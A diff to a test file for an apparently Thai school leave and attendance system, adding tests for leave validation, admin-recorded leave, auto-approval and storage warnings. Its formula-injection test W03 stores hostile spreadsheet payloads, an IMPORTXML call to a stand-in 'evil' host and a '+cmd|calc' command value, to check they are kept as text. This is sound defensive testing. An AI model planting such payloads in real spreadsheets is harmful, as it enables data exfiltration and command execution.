@@ -606,7 +606,9 @@ test('V01', 'ยื่นใบลา: ตรวจสอบข้อมูล (
   expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { type: 'XXX' })), 'VALIDATION');
   expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { endDate: '2026-11-10' })), 'VALIDATION');
   expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { endDate: '2026-11-12', period: 'MORNING' })), 'VALIDATION');
-  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { reason: 'x' })), 'VALIDATION');
+  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { type: 'OTHER' })), 'VALIDATION'); // อื่น ๆ ต้องพิมพ์ประเภท
+  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { startDate: '2028-12-01', endDate: '2028-12-01' })), 'VALIDATION'); // ล่วงหน้าเกิน 2 ปี
+  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { reason: 'x'.repeat(501) })), 'VALIDATION');
   expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { startDate: '2026-11-14', endDate: '2026-11-15' })), 'VALIDATION');
   const fake = { name: 'a.pdf', mimeType: 'application/pdf', data: Buffer.from('MZ-not-a-pdf').toString('base64') };
   expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { attachment: fake })), 'VALIDATION');
@@ -656,6 +658,64 @@ test('V04', 'ลาครึ่งวันเช้า: มาสายไม�
   sys.at('2026-11-09 12:30:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
   const d = ok(sys.api(t.token, 'me.dashboard', {}));
   assert.strictEqual(d.today.row.status, 'PRESENT'); assert.strictEqual(d.month.totals.late, 0); assert.strictEqual(d.month.totals.leaveDays, 0.5);
+});
+
+test('V05', 'ลาแบบง่าย: ย้อนหลังนานได้, ไม่ต้องใส่เหตุผล, ลาคลอด 90 วัน, "อื่น ๆ" พิมพ์ประเภทเองและแสดงในรายงาน', () => {
+  const sys = newSystem({ now: '2026-11-09 07:00:00' });
+  const t = addTeacher(sys, 1), m = addTeacher(sys, 2);
+  const old = ok(sys.api(t.token, 'leave.submit', { type: 'PERSONAL', startDate: '2026-03-02', endDate: '2026-03-02' })).leave; // ย้อนหลัง ~8 เดือน ไม่มีเหตุผล
+  assert.strictEqual(old.status, 'PENDING'); assert.strictEqual(old.reason, '');
+  const mat = ok(sys.api(m.token, 'leave.submit', { type: 'MATERNITY', startDate: '2026-12-01', endDate: '2027-02-28' })).leave;
+  assert.strictEqual(mat.typeLabel, 'ลาคลอดบุตร'); assert.ok(mat.days > 55, mat.days);
+  const other = ok(sys.api(t.token, 'leave.submit', { type: 'OTHER', typeDetail: 'ลาอุปสมบท', startDate: '2026-11-09', endDate: '2026-11-09' })).leave;
+  assert.strictEqual(other.typeLabel, 'ลาอุปสมบท');
+  ok(sys.api(sys.admin, 'leave.review', { leaveId: other.leaveId, decision: 'APPROVE' }));
+  sys.at('2026-11-09 17:00:00');
+  const row = ok(sys.api(sys.admin, 'report.daily', { date: '2026-11-09' })).tables[0].rows.find(r => r.employeeId === t.id);
+  assert.strictEqual(row.statusCode, 'LEAVE'); assert.ok(row.note.includes('ลาอุปสมบท'), row.note);
+  assert.strictEqual(records(sys, 'LeaveRequests').find(r => r.LeaveID === other.leaveId).TypeDetail, 'ลาอุปสมบท');
+});
+
+test('V06', 'ผู้ดูแล/ผู้บริหารบันทึกการลาให้บุคลากร → อนุมัติทันที; บันทึกให้ตนเอง → รอผู้อื่นอนุมัติ; บุคลากรทั่วไปทำไม่ได้', () => {
+  const sys = newSystem();
+  const t = addTeacher(sys, 1), ex = addTeacher(sys, 2, 'EXECUTIVE');
+  const r = ok(sys.api(sys.admin, 'leave.adminCreate', { employeeId: t.id, type: 'SICK', startDate: '2026-11-09', endDate: '2026-11-09' }));
+  assert.strictEqual(r.leave.status, 'APPROVED'); assert.ok(/อนุมัติแล้ว/.test(r.message));
+  const rec = records(sys, 'LeaveRequests')[0];
+  assert.strictEqual(rec.RecordedBy, 'นายผู้ดูแล ระบบโรงเรียน'); assert.strictEqual(rec.ReviewedByName, 'นายผู้ดูแล ระบบโรงเรียน');
+  assert.strictEqual(ok(sys.api(t.token, 'leave.my', {}))[0].cancellable, false); // ครูยกเลิกใบลาที่อนุมัติแล้วเองไม่ได้
+  expectErr(sys.api(t.token, 'leave.cancel', { leaveId: r.leave.leaveId }), 'VALIDATION');
+  expectErr(sys.api(sys.admin, 'leave.adminCreate', { employeeId: t.id, type: 'PERSONAL', startDate: '2026-11-09', endDate: '2026-11-09' }), 'DUPLICATE');
+  ok(sys.api(ex.token, 'leave.adminCreate', { employeeId: t.id, type: 'OFFICIAL', startDate: '2026-11-10', endDate: '2026-11-11' }));
+  const selfRec = ok(sys.api(ex.token, 'leave.adminCreate', { employeeId: ex.id, type: 'PERSONAL', startDate: '2026-11-12', endDate: '2026-11-12' }));
+  assert.strictEqual(selfRec.leave.status, 'PENDING');
+  expectErr(sys.api(t.token, 'leave.adminCreate', { employeeId: t.id, type: 'SICK', startDate: '2026-11-13', endDate: '2026-11-13' }), 'FORBIDDEN');
+  assert.ok(records(sys, 'AuditLogs').some(l => l.Action === 'LEAVE_RECORD_BY_ADMIN'));
+  sys.at('2026-11-09 17:00:00');
+  assert.strictEqual(ok(sys.api(sys.admin, 'admin.overview', {})).counts.leave, 1);
+});
+
+test('V07', 'ตั้งค่า "การลาไม่ต้องรออนุมัติ": ครูกดยืนยันแล้วมีผลทันที และยกเลิกเองได้', () => {
+  const sys = newSystem();
+  const t = addTeacher(sys, 1);
+  ok(sys.api(sys.admin, 'settings.save', { values: { LEAVE_REQUIRES_APPROVAL: false } }));
+  assert.strictEqual(ok(sys.api(t.token, 'me.dashboard', {})).settings.leaveRequiresApproval, false);
+  const r = ok(sys.api(t.token, 'leave.submit', { type: 'SICK', startDate: '2026-11-09', endDate: '2026-11-09' }));
+  assert.strictEqual(r.leave.status, 'APPROVED'); assert.strictEqual(r.leave.reviewedByName, 'อนุมัติอัตโนมัติ'); assert.strictEqual(r.leave.cancellable, true);
+  assert.ok(/บันทึกการลาเรียบร้อย/.test(r.message));
+  sys.at('2026-11-09 17:00:00');
+  assert.strictEqual(ok(sys.api(sys.admin, 'report.daily', { date: '2026-11-09' })).tables[0].rows.find(x => x.employeeId === t.id).statusCode, 'LEAVE');
+  ok(sys.api(t.token, 'leave.cancel', { leaveId: r.leave.leaveId }));
+  assert.strictEqual(ok(sys.api(sys.admin, 'report.daily', { date: '2026-11-09' })).tables[0].rows.find(x => x.employeeId === t.id).statusCode, 'ABSENT');
+});
+
+test('D02', 'แจ้งเตือนเมื่อพื้นที่ Google Drive ใกล้เต็ม (≥ 85%)', () => {
+  const sys = newSystem();
+  assert.ok(!ok(sys.api(sys.admin, 'admin.overview', {})).warnings.some(w => /Google Drive/.test(w)));
+  sys.env.state.storageUsed = 14 * 1024 ** 3;
+  const w = ok(sys.api(sys.admin, 'admin.overview', {})).warnings.find(x => /Google Drive/.test(x));
+  assert.ok(w && /93%/.test(w), w);
+  assert.strictEqual(ok(sys.api(sys.admin, 'settings.get', {})).storage.percent, 93);
 });
 
 /* ================================================================== CORRECTION */
@@ -980,10 +1040,10 @@ test('W02', 'ไม่มีข้อมูลลับ (PasswordHash/Pepper/Spr
 test('W03', 'ข้อความที่ขึ้นต้นด้วย = + - @ ถูกบันทึกเป็นข้อความ (ป้องกัน Formula Injection)', () => {
   const sys = newSystem();
   const t = addTeacher(sys, 1);
-  const lv = ok(sys.api(t.token, 'leave.submit', { type: 'OTHER', startDate: '2026-11-10', endDate: '2026-11-10', reason: '=IMPORTXML("http://evil","//a")' })).leave;
+  const lv = ok(sys.api(t.token, 'leave.submit', { type: 'OTHER', typeDetail: '@SUM(A1)', startDate: '2026-11-10', endDate: '2026-11-10', reason: '=IMPORTXML("http://evil","//a")' })).leave;
   ok(sys.api(sys.admin, 'leave.review', { leaveId: lv.leaveId, decision: 'REJECT', note: '+cmd|calc' }));
   const rec = records(sys, 'LeaveRequests')[0];
-  assert.strictEqual(rec.Reason, '=IMPORTXML("http://evil","//a")'); assert.strictEqual(rec.ReviewNote, '+cmd|calc');
+  assert.strictEqual(rec.Reason, '=IMPORTXML("http://evil","//a")'); assert.strictEqual(rec.ReviewNote, '+cmd|calc'); assert.strictEqual(rec.TypeDetail, '@SUM(A1)');
 });
 
 
